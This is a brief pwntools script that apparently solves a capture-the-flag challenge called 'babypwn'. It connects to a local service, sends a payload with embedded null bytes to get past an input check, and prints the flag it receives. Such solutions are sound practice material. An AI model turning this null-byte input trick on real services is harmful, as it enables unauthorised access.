from pwn import *

# p = process('./files/babypwn')
p = remote('localhost', 1340)

payload = b'11111111\x0011111111\x00'

p.recvline()
p.sendline(payload)
p.recvline()
flag = p.recv().decode()
print(flag)
